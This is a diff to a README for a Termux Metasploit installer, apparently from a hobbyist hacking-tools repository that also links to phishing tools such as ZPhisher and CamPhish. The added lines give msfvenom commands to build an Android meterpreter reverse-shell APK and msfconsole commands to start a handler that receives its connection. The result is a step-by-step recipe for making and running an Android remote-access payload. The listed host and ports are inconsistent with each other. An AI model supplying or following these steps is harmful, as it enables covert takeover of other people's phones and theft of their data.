@@ -28,6 +28,18 @@ All Credit :- <a href="https://github.com/T-Dynamos/Metasploit">Ansh Dadwal</a>
      cd Metasploit
      bash Exploit.sh
 
+     After Install Metasploit Use This Cmd For Make App
+     msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=15181 R >/sdcard/BaapG.apk
+
+     After Install Apk Use This Cmd
+
+     msfconsole
+     use exploit/multi/handler
+     set payload android/meterpreter/reverse_tcp
+     set LHOST 127.0.0.1
+     set LPORT 4444
+     exploit
+
 
 <a href="https://github.com/Vretlee/ZPhisher"><img title="" src="https://github.com/T-Dynamos/Metasploit/raw/main/Screenshot_2021-07-12-10-49-33-340_com.termux.jpg" data-canonical-src="https://github-readme-stats.vercel.app/api/pin/?username=noob-hackers&amp;repo=ipdrone&amp;theme=highcontrast" style="max-width:100%;"></a>
 <a href="https://github.com/Vretlee/CamPhish"><img title="" src="https://github.com/Vretlee/Metasploit/blob/main/Screenshot_2021-07-29-12-30-45-215_com.termux.jpg" data-canonical-src="https://github-readme-stats.vercel.app/api/pin/?username=noob-hackers&amp;repo=ipdrone&amp;theme=highcontrast" style="max-width:100%;"></a>
